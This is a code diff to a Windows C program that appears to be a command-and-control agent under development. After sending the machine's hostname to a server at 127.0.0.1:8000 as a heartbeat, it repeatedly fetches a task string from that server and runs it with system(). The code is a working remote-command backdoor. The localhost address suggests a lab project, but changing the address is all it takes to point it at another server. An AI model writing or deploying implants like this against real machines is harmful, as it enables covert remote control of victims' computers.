@@ -2,11 +2,27 @@
 #include <curl/curl.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <string.h>
 
+const char IP_ADDRESS[] = "127.0.0.1";
+const char PORT[] = "8000";
 
+char *get_task(const char *hostname);
+
+static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    size_t realsize = size * nmemb;
+    char **buf = (char **)userdata;
+    size_t cur_len = *buf ? strlen(*buf) : 0;
+    char *newbuf = realloc(*buf, cur_len + realsize + 1);
+    if(!newbuf) return 0;
+    memcpy(newbuf + cur_len, ptr, realsize);
+    newbuf[cur_len + realsize] = '\0';
+    *buf = newbuf;
+    return realsize;
+}
 
 int heartbeat(char *hostname);
-
+/* char get_task(char *hostname, char *IP_ADDRESS, char *PORT); */
 int main(void) {
 
     char hostname[1024];
@@ -17,11 +33,51 @@ int main(void) {
     }
 
     printf("Hostname: %s\n", hostname);
-    heartbeat(hostname);
+    while (heartbeat(hostname))
+    {
+        Sleep(2000); /* wait for 5 seconds before retrying */
+        printf("Retrying heartbeat...\n");
+    }
+    
+    while(1){
+        system(get_task(hostname));
+        Sleep(3000);
+    }
+
     return 0;
 }
 
 
+
+char *get_task(const char *hostname)
+{
+    CURL *curl;
+    CURLcode res;
+    char url[1024];
+    snprintf(url, sizeof(url), "http://%s:%s/getTask?path=host/%s/task.txt", IP_ADDRESS, PORT, hostname);
+
+    curl = curl_easy_init();
+    if(!curl) return NULL;
+
+    char *response = NULL; // will be realloc'd in callback
+
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
+
+    res = curl_easy_perform(curl);
+    if(res != CURLE_OK) {
+        fprintf(stderr, "GET failed: %s\n", curl_easy_strerror(res));
+        free(response);
+        response = NULL;
+    }
+
+    curl_easy_cleanup(curl);
+    return response; // NULL on error, otherwise caller must free()
+}
 
 
 int heartbeat(char *hostname){
@@ -40,13 +96,16 @@ int heartbeat(char *hostname){
 
     /*Build json hostname for POST*/
     char json_payload[1024];
+    char url[1024];
+    snprintf(url, sizeof(url), "http://%s:%s/heartbeat", IP_ADDRESS, PORT);
+    printf("%s\n", url);
     snprintf(json_payload, sizeof(json_payload), "{\"hostname\":\"%s\"}", hostname);
 
     /*Inits a curl session*/
     curl=curl_easy_init();
     if(curl){
         /*Set the URL for the operation*/
-        curl_easy_setopt(curl,CURLOPT_URL,"http://127.0.0.1:8000/heartbeat");
+        curl_easy_setopt(curl,CURLOPT_URL, url);
         /*Enable POST*/
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
